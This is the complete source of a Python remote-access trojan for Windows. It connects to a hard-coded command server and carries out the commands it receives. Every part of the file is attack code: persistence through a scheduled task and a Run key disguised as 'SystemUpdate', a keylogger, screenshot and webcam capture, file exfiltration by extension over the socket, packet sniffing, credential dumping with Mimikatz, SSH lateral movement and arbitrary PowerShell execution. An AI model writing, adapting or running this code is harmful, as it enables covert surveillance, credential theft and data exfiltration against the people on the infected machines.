import socket
import subprocess
import os
import time
import pyautogui
import cv2
from pynput.keyboard import Listener
from scapy.all import sniff, Raw
import paramiko

# Server connection settings
IP = "192.168.100.6"
PORT = 5050

def escalate_privileges():
    script_path = os.path.abspath(__file__)  
    script_path_escaped = script_path.replace('\\', '\\\\')  
    task_name = "ElevatedPythonTask"
    
    command_create = f'SCHTASKS /CREATE /TN "{task_name}" /TR "python \\"{script_path_escaped}\\"" /SC ONLOGON /RL HIGHEST /F'
    
    result_create = subprocess.run(["powershell", "-Command", command_create], capture_output=True, text=True)
    if result_create.returncode != 0:
        print(f"[ERROR] Failed to create task: {result_create.stderr.strip()}")
        return  
    
    result_run = subprocess.run(["powershell", "-Command", f"SCHTASKS /RUN /TN \"{task_name}\""], capture_output=True, text=True)
    if result_run.returncode != 0:
        print(f"[ERROR] Failed to run task: {result_run.stderr.strip()}")

def setup_persistence():
    script_path = os.path.abspath(__file__)
    registry_path = 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'
    property_name = 'SystemUpdate'

    check_command = f"Get-ItemProperty -Path '{registry_path}' -Name '{property_name}' -ErrorAction SilentlyContinue"
    result = subprocess.run(["powershell", "-Command", check_command], capture_output=True, text=True)

    if result.returncode != 0:
        create_command = f"New-ItemProperty -Path '{registry_path}' -Name '{property_name}' -Value 'python \"{script_path}\"' -PropertyType String"
        subprocess.run(["powershell", "-Command", create_command])
        print("[INFO] Persistence set up successfully.")
    else:
        print("[INFO] Persistence already exists; skipping creation.")

def start_keylogger():
    def on_press(key):
        with open("C:\\Users\\Public\\keylogs.txt", "a") as log:
            log.write(str(key) + "\n")
    listener = Listener(on_press=on_press)
    listener.start()

def capture_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot_path = "C:\\Users\\Public\\screenshot.png"
    screenshot.save(screenshot_path)
    print("[INFO] Screenshot captured.")
    # return screenshot_path

def capture_webcam():
    cam = cv2.VideoCapture(0)
    if not cam.isOpened():
        print("[ERROR] Unable to access the webcam.")
        return None

    ret, frame = cam.read()
    webcam_path = "C:\\Users\\Public\\webcam.jpg"
    if ret:
        cv2.imwrite(webcam_path, frame)
        print("[INFO] Webcam image captured.")
        return webcam_path
    else:
        print("[ERROR] Failed to capture webcam image.")
    cam.release()
    return None

def find_and_exfiltrate_files(extension):
    for root, dirs, files in os.walk("C:\\"):
        for file in files:
            if file.endswith(extension):
                file_path = os.path.join(root, file)
                with open(file_path, "rb") as f:
                    data = f.read()
                    client_socket.send(data)

def sniff_network():
    def packet_callback(packet):
        if packet.haslayer(Raw):
            with open("C:\\Users\\Public\\network_log.txt", "a") as log:
                log.write(str(packet[Raw].load) + "\n")
    sniff(prn=packet_callback, store=0)

def dump_credentials():
    result = subprocess.run(["powershell", "-Command", "Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords'"], capture_output=True)
    if result.returncode == 0:
        print("[INFO] Credentials dumped.")
    else:
        print("[ERROR] Failed to dump credentials.")

def lateral_movement(target_ip, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(target_ip, username=username, password=password)
        print("[INFO] Lateral movement complete.")
    except Exception as e:
        print(f"[ERROR] Lateral movement failed: {str(e)}")





def list_drives():
    drives = []
    for drive in range(65, 91):  # ASCII 'A' to 'Z'
        drive_letter = f"{chr(drive)}:"
        if os.path.exists(drive_letter):
            drives.append(drive_letter)
    return drives

def list_directory(path):
    try:
        return os.listdir(path)
    except Exception as e:
        return str(e)

def change_directory(path):
    try:
        os.chdir(path)
        return f"[INFO] Changed directory to: {os.getcwd()}"
    except FileNotFoundError:
        return f"[ERROR] Directory not found: {path}"

def execute_powershell_command(command):
    result = subprocess.run(["powershell", "-Command", command], capture_output=True, text=True)
    return result.stdout + result.stderr





client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((IP, PORT))

escalate_privileges()
setup_persistence()
start_keylogger()

try:
    while True:
        command = client_socket.recv(1024).decode("utf-8").strip('"')

        if command.lower() == "exit":
            break
        elif command.lower() == "listdrives":
            drives = list_drives()
            client_socket.send(", ".join(drives).encode("utf-8"))
        elif command.lower().startswith("cd "):
            path = command[3:].strip()
            response = change_directory(path)
            client_socket.send(response.encode("utf-8"))
        elif command.lower() == "dir":
            current_dir = os.getcwd()
            directory_contents = list_directory(current_dir)
            client_socket.send("\n".join(directory_contents).encode("utf-8"))
        elif command.lower() == "screenshot":
            screenshot_path = capture_screenshot()
            if screenshot_path:
                with open(screenshot_path, "rb") as f:
                    client_socket.sendall(f.read())
        elif command.lower() == "webcam":
            webcam_path = capture_webcam()
            if webcam_path:
                with open(webcam_path, "rb") as f:
                    client_socket.sendall(f.read())


        elif command.lower().startswith("exfiltrate"):
            _, extension = command.split()
            find_and_exfiltrate_files(extension)
            client_socket.send(b"[INFO] File exfiltration complete.")


            
        elif command.lower() == "sniff":
            sniff_network()
            client_socket.send(b"[INFO] Network sniffing started.")
        elif command.lower() == "dumpcreds":
            dump_credentials()
            client_socket.send(b"[INFO] Credentials dumped.")
        else:
            response = execute_powershell_command(command)
            client_socket.send(response.encode("utf-8"))

except Exception as e:
    client_socket.send(f"[ERROR] {str(e)}".encode("utf-8"))

finally:
    client_socket.close()
